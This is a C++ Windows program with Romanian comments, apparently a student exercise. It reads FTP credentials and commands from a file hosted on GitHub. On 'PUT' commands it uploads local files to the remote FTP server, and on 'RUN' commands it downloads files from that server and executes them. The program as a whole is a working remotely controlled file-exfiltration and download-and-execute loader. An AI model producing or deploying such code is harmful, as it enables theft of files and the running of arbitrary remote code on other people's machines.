#include <Windows.h>
#include <WinInet.h>
#include <iostream>
#include <sstream>
#pragma comment(lib, "Wininet") 

#define BUFFER 8192

using namespace std;

int main()
{
    // initializarea librariei wininet
    HINTERNET hInternet = InternetOpen(
        "Alex",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        NULL
    );
    if (hInternet == NULL)
    {
        cout << "Failed at InternetOpen() " << GetLastError() << "\n";
        return -1;
    }

    // conectarea la server-ul http
    HINTERNET hConnect = InternetConnect(
        hInternet,
        "raw.githubusercontent.com",
        443,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        NULL,
        NULL
    );
    if (hConnect == NULL)
    {
        cout << "Failed at InternetConnect() " << GetLastError() << "\n";
        return -1;
    }

    // construirea pachetului http
    const char* acceptTypes[] = { "text/*", NULL };
    HINTERNET hOpenRequest = HttpOpenRequest(
        hConnect,
        "GET",
        "bita-alexandru/facultate/master/info.txt",
        "1.1",
        NULL,
        acceptTypes,
        INTERNET_FLAG_SECURE,
        NULL
    );
    if (hOpenRequest == NULL)
    {
        cout << "Failed at HttpOpenRequest() " << GetLastError() << "\n";
        return -1;
    }

    // trimitearea pachetului http
    BOOL sendRequest = HttpSendRequest(
        hOpenRequest,
        NULL,
        NULL,
        NULL,
        NULL
    );
    if (!sendRequest)
    {
        cout << "Failed at HttpSendRequest() " << GetLastError() << "\n";
        return -1;
    }

    // citirea raspunsului
    char buf[BUFFER] = {};
    DWORD sizeRead;
    BOOL readFile = InternetReadFile(
        hOpenRequest,
        buf,
        BUFFER,
        &sizeRead
    );
    if (!readFile)
    {
        cout << "Failed at InternetReadFile() " << GetLastError() << "\n";
        return -1;
    }

    InternetCloseHandle(hOpenRequest);
    InternetCloseHandle(hConnect);

    cout << buf << "\n";

    char cwd[BUFFER] = {};
    GetCurrentDirectory(BUFFER, cwd);
    strcat_s(cwd, "\\\0");

    // preluarea datelor de logare
    stringstream parser(buf);
    int n;
    string address;
    string username;
    string password;

    parser >> n >> address >> username >> password;

    // conectarea la server-ul ftp
    hConnect = InternetConnect(
        hInternet,
        address.c_str(),
        21,
        username.c_str(),
        password.c_str(),
        INTERNET_SERVICE_FTP,
        INTERNET_FLAG_PASSIVE,
        NULL
    );

    for (int i = 0; i < n; i++)
    {
        string comm;
        string path;

        parser >> comm >> path;

        if (comm == "PUT")
        {
            string local = path;
            string remote = path;

            size_t pos = 0;
            string token;
            while ((pos = remote.find("\\")) != string::npos) {
                token = remote.substr(0, pos);
                remote.erase(0, pos + 1);
            }
            
            // incarcarea fisierului
            BOOL putFile = FtpPutFile(
                hConnect,
                local.c_str(),
                remote.c_str(),
                FTP_TRANSFER_TYPE_ASCII,
                NULL
            );
            if (!putFile)
            {
                cout << "Failed at FtpPutFile() " << GetLastError() << "\n";
                return -1;
            }
        }
        else if (comm == "RUN")
        {
            string local = (cwd + path);
            string remote = path;

            // descarcarea fisierului
            BOOL getFile = FtpGetFile(
                hConnect,
                remote.c_str(),
                local.c_str(),
                TRUE,
                FILE_ATTRIBUTE_NORMAL,
                FTP_TRANSFER_TYPE_ASCII,
                NULL
            );
            if (!getFile)
            {
                cout << "Failed at FtpGetFile() " << GetLastError() << "\n";
                return -1;
            }

            PROCESS_INFORMATION pi;
            STARTUPINFO si;
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            BOOL createProcess = CreateProcess(
                local.c_str(),
                NULL,
                NULL,
                NULL,
                FALSE,
                CREATE_NEW_CONSOLE,
                NULL,
                NULL,
                &si,
                &pi
            );
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            if (!createProcess)
            {
                cout << "Failed at CreateProcess() " << GetLastError() << "\n";
                return -1;
            }
        }
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}
